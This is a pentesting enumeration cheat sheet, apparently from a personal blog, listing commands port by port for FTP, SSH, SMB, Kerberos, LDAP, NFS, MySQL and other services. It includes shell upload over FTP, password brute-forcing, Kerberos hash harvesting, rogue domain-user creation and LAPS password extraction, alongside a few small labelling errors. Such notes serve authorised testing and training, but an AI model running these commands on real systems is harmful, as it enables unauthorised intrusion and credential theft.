---
title: 3. Enumeration - Linux
date: 2024-08-02 11:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Windows
  - Linux
toc: true
---

---
Step 3 in a penetration test: Enumeration.
Try to find relevant info to enter the target machine.

---
<!-- more -->

<br>

## Port 21/TCP - FTP
```bash
nmap --script=*ftp* -p21 $IP -oN recon/nmap.ftp

ftp-user-enum.pl -U users.txt -t $IP
```
```bash write permissions
# mount/unmount shares
curlftpfs anonymous@$IP ftp-local-mount-dir/
fusermount -u ftp

# upload files with curl
curl -v -P - 'ftp://username:password@$IP/files/' -T "/var/www/html/shell.sh"

# upload files manually, depending on file type
> ascii
> binary
> put $file
```
```bash no access to view files
quote PASV
```
```mod_copy RCE vsftpd 1.3.5
nc -v $IP 21
site cpfr /my/local/file
site cpto /directory/i-have/access-to
```
```bash download all files recursively
wget -r ftp://anonymous:@$IP
```

<br>

## Port 22/TCP - SSH
```bash execute command upon login
ssh -t user@$IP 'id; bash -l'
```
```bash passphrase-protected private key
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
```bash SSH tunnels
# local
ssh -L $local_IP:$local_port:destination_IP:$destination_port user@$SSH_server
# remote
ssh -R $remote_IP:$remote_port:destination_IP:$destination_port user@$SSH_server
# do not execute a command
# -N
# run in the background
# -f
```

<br>

## Port 23/TCP - Telnet
```bash
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $IP -oN recon/nmap.telnet
```

<br>

## Port 25,465,587/TCP - SMTP
```bash
nmap --script smtp-enum-users $IP -oN recon/nmap.smtp-users
nmap -p25 --script smtp-commands $IP -oN recon/nmap.smtp-comm

# if NTLM auth is enabled (WINDOWS)
nmap -sS -v --script=*-ntlm-info --script-timeout=60s $domain -oN recon/nmap.smtp-ntlm
```
```bash
# modes: EXPN, VRFY or RCPT (default: VRFY)
smtp-user-enum -u $USER -t $IP -M $MODE 
```
```bash
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $IP; run"
```
```bash
swaks --to user@example.com --server test-server.example.net
```

<br>

## Port 43/TCP - WHOIS
```bash
whois -h $IP -p 43 "$domain"
echo "$domain" | nc -vn $IP
```

<br>

## Port 53/TCP/UDP - DNS
```bash
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" $IP -oN recon/nmap.dns
dnscan.py -d $domain -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
```bash query info about the server
dig @$IP $domain
```
```bash zone transfer (TCP)
dnsrecon -d $domain -t axfr
dig axfr $domain ns08.$domain
```
```bash bruteforce subdomains
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "$domain" -H "Host: FUZZ.$domain" --hl 7
gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u $domain
nmap -T4 -p 53 --script dns-brute $domain
```

<br>

## Port 69/TCP - TFTP
```bash
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IP -oN recon/nmap.tftp
```
```bash download/upload
msfconsole -q -x "use auxiliary/admin/tftp/tftp_transfer_util; set RHOSTS $IP; run"
```

<br>

## Port 80/TCP,443/HTTPs - HTTP,HTTPS
```bash Enumerate web server based on .ds_store
python ds_walk.py -u $URL
```
```bash
python3 iis_shortname_Scan.py $URL
```

<br>

## Port 88/TCP,UDP - Kerberos
```bash enumerate users (need users list)
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$domain",userdb=/path/to/userlist $IP -oN recon/nmap.kerberos-enum-u
```
```bash bruteforce passwords
# linux
kerbrute -domain $domain -users users.txt -passwords passwords.txt -outputfile recon/kerbrute.out
# windows
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:$domain /outfile:rubeus.txt
```
```bash harvest the non-preauth AS_REP responses
impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile files/hashes.out
```
```bash [with creds] get a list of SPNs (service principal names)
impacket-GetUserSPNs -request -dc-ip $IP active.htb/svc_tgs
```

<br>

## Port 110/TCP,995/TCP - POP3,POP3S
```bash grab banner
nc -nv $IP 110
openssl s_client -crlf -connect $IP:995
```
```bash NTLM info disclosure
nmap -p 110,995 --script pop3-ntlm-info $IP -oN nmap/pop3-ntlm
```
```bash capabilities
nmap -p 110,995 --script pop3-capabilities $IP -oN nmap/pop3-cap
```
```bash commands 
USER    Username or mailbox.
PASS    Server/mailbox-specific password.
STAT    Number of messages in the mailbox.
LIST    [ message# ] Messages summary.
RETR    [ message# ] Retrieve selected message.
DELE    [ message# ] Delete selected message.
RSET    Reset the session. Restore deleted messages.
NOOP    No-op. Keeps connection open.
QUIT    End session.
```

<br>

## Port 111/TCP - RPCbind
```bash
rpcinfo $IP
# RPC + NFS   = list, download, upload shares
# NIS         = ypbind - sensitive files
# RPC users   = rusersd - enumerate users
```

<br>

## Port 135/TCP - MSRPC
```bash
nmap -sV -script msrpc-enum -Pn $IP -oN recon/nmap.msrpc
```
```bash dump
# RPC endpoints
impacket-rpcdump $IP

# SAMR info
impacket-samrdump $IP
```
```bash
rpcclient -U "" -N $IP
rpcclient -U user%domain@$IP
rpcclient //$IP -U $domain/user%$hash --pw-nt-hash
```
```bash commands
> enumprinters
> enumdomains

> enumdomusers

> queryuser $username

> enumdomgroups

> querygroup 0x$number

> querydominfo
> querydispinfo
> enumprivs
> getdompwinfo
> getusrdompwinfo 0xnumber
> dsroledominfo
> netshareenum
> netshareenumall

> createdomuser $username
> setuserinfo2 $username 24 $password
> lookupnames $username

> chgpasswd $username $old-pass $new-pass
```

<br>

## Port 137/TCP/UDP,138/UDP,139/TCP - NetBIOS
```bash
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $IP -oN recon/nmap.nbtstat
```
```bash
# linux
nmblookup -A $IP
nbtscan -v $IP
# windows
nbstat -A $IP
```

<br>

## Port 139/TCP,445/TCP - NetBIOS,SMB
```bash
enum4linux -avA $IP > recon/enum4linux.out
enum4linux -avA $IP -u user -p pass > recon/enum4linux.out
```
```bash hostname
nmblookup -A $IP
nbtscan -r $NET
```
```bash domain info
polenum '':''@$IP 2>&1
```
```bash server info
rpcclient -W 'WORKGROUP' -U''%'' -c 'srvinfo' $IP 2>&1
```
```bash version
msfconsole -q -x 'use /scanner/smb/smb_version ; set rhosts $IP; run'
```
```bash usernames
net rpc group members 'None' -W 'WORKGROUP' -I $IP -U''%'' 2>&1
rpcclient -W 'WORKGROUP' -c querydispinfo -U''%'' $IP 2>&1
```
```bash vulns
nmap --script smb-vuln* -p 139,445 $IP
```
```bash list shares
nmap --script "safe or smb-enum-*" -p 139,445 $IP -oN recon/nmap.smb

# [smbmap] list share (-r) and retrieve share (-A)
smbmap -H $IP -r -u 'anonymous'
smbmap -H return.local -u svc-printer -p "1edFg43012\!\!" -r 

smbclient -N -L \\\\$IP 
smbclient -N \\\\$IP\\Share --client-protection=off
smbclient -U 'user%passwd' -L //$IP
smbclient //$IP/Share -U user --pw-nt-hash $hash -W $domain

# download files recursively
smbclient '\\\\$IP\\share' -N -c 'prompt OFF ; recurse ON ; cd "where\from" ; lcd "where/to" ; mget *'
```
```bash authentication bruteforce
hydra -L user.txt -P pass.txt $IP smb
acccheck -t $IP -v -u user -P /usr/share/dirb/wordlist/common.txt
```

<br>

## Port 143/TCP,993/TCP - IMAP,IMAPS
```bash
nc -nv $IP 143
openssl s_client -connect $IP:993 -quiet
```
```bash GUI applications
evolution
thunderbird
```
```bash IMAP commands
# login
A1 LOGIN "username" "password"
# list folders/mailboxes
A1 LIST "" *
A1 LIST INBOX *
A1 LIST "Archive" *
# select a mailbox
A1 SELECT INBOX
# list messages
A1 FETCH 1:* (FLAGS)
A1 UID FETCH 1:* (FLAGS)
# view messages
A1 FETCH 2 body[text]
A1 FETCH 2 all
A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])
```
```bash view and download messages with curl
# view
curl -k 'imaps://$IP/' --user user:pass
curl -k 'imaps://$IP/inbox_name?ALL' --user user:pass 
curl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass
# download
curl -k 'imaps://1.2.3.4/Drafts;MAILINDEX=1' --user user:pass
```
```bash NTLM auth info disclosure
nmap -p 143,993 --script imap-ntlm-info $IP -oN recon/nmap.imap-ntlm
```
```bash bruteforce passwords
hydra -I -V -F -l user -P /usr/share/wordlists/rockyou.txt $IP imap 
hydra -S -V -l user -P /usr/share/wordlists/rockyou.txt -s 993 $IP imap
```

<br>

## Port 161/TCP,162/UDP - SNMP
```bash
xprobe2 -v -p udp:161:open $IP
```

<br>

## Port 389/TCP,636/TCP,3269/TCP - LDAP,tcpwrapped
```bash enumeration
nmap -n -sV --script "ldap* and not brute" $IP -oN recon/nmap.ldap
```
```bash ldapsearch
# null creds
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=domain,DC=name"
# authenticate
ldapsearch -x -H ldap://$IP -D '$domain\user' -w 'password' -b "CN=Remote Desktop Users,CN=Builtin,DC=domain,DC=name"
# extract info anonymously
ldapsearch -x -H ldaps://$IP:636/ -s base -b '' "(objectClass=*)" "*" +
# check admin password if LAPS is enabled
ldapsearch -x -H ldap://$IP -D '$domain\user' -w 'password' -b "dc=domain,dc=name" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

<br>

## Port 500/TCP - IKE
> Internet Key Exchange (IKE), used to establish an IPsec VPN

```bash
ike-scan -M $IP
ike-scan -M --ikev2 $IP
```

<br>

## Port 2049/TCP - NFS
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP -oN recon/nmap.nfs-enum
nmap --script "nfs-ls, nfs-showmount, nfs-statfs" $IP- oN recon/nmap.nfs-list
```
```bash
showmount -e $IP
msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS $IP; run"
# check config files
# /etc/exports
# /etc/lib/nfs/etab
```
```bash mount/unmount shares
# create mount point
sudo mkdir /mnt/local_share
# mount the opn share
sudo mount -t nfs -o rw,vers=2 $IP:/share_name /mnt/local_share
# unmount share
sudo umount /mnt/nfs-share

# match the user with UID and GID if mounting a share with restricted permissions
python2 ~/tools/NfSpy/nfspy.py -o server=$IP:/share_name,nfsport=2049/tcp,rw /mnt/local_share
```

<br>

## Port 3306/TCP - MySQL
```bash 
nmap -sV -Pn -T4 -vv -script=mysql* $IP -p 3306 -oN recon/nmap.mysql
```
```bash interact with the DB
mysql -u'root' -p'root' -h $IP -D database
sqlitebrowser
```
```sql
show databases;
use db_name;
show tables;
select * from table_name;
select * from table_name \G
```
```bash check for credentials
find / -type f -name wp-config.php 2>/dev/null
```

<br>

## Port 3389/TCP - RDP
```bash authenticate
xfreerdp /u:username /p:'password' /v:$IP /f +clipboard # /d:domain /cert:ignore
rdesktop $IP -d $domain -u $username -p '$password'
remmina -c rdp://user@$IP
```
```bash check credentials
impacket-rdp_check $domain/$username:$password@$IP
# look for an username upon connecting
rdesktop -u "" -a $IP
```

<br>

## Port 6667/TCP,6697/TCP - IRC
```bash manual inspection
nc -nv $IP 6667 # connect to server
USER admin * 0 admin ; NICK admin # authenticate
admin? ADMIN # list commands
```
```bash irssi
irssi -c $IP -p 6697 - /exit
```

<br>

## Port 11211/TCP - memcache
```bash
echo "stats items" | nc -vn -w 1 $IP 11211  # Get items of slabs with info
echo "get <item_name>" | nc -vn -w 1 $IP 11211  # Get saved info
```

<br>

---
---
